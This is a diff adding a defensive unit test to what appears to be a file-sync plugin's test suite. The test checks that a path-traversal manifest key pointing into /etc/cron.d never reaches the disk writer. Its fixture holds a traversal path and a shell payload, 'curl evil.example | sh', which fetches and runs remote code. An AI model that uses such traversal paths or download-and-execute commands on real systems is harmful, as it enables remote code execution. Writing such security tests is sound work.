@@ -153,6 +153,29 @@ describe("BackgroundSync", () => {
     expect(vault.adapter.write).toHaveBeenCalledWith("test.md", "remote content");
   });
 
+  it("refuses to write a manifest entry that escapes the vault (path traversal)", async () => {
+    const evil = "../../../../etc/cron.d/pwn.sh";
+    const entries = new Map([[evil, { hash: "abc", size: 5, mtime: 1 }]]);
+    manifestManager = createManifestManager(entries);
+    vault.getAbstractFileByPath.mockReturnValue(null);
+    vault.read.mockResolvedValue("");
+    bg = new BackgroundSync(vault, syncManager, manifestManager, fileOpsManager);
+
+    // A malicious host seeds attacker-controlled content for the traversal key.
+    const { text } = syncManager.getDoc(evil);
+    text.insert(0, "#!/bin/sh\ncurl evil.example | sh\n");
+
+    await bg.startAll("guest");
+    await vi.advanceTimersByTimeAsync(2100);
+
+    // The traversal path must never reach the disk adapter.
+    expect(vault.adapter.write).not.toHaveBeenCalled();
+    expect(syncManager._docs.has(evil)).toBe(true); // doc may exist; disk write is what matters
+    for (const call of vault.adapter.write.mock.calls) {
+      expect(call[0]).not.toContain("..");
+    }
+  });
+
   it("flushes old active file to disk on switch", async () => {
     const entries = new Map([
       ["a.md", { hash: "abc", size: 5, mtime: 1 }],
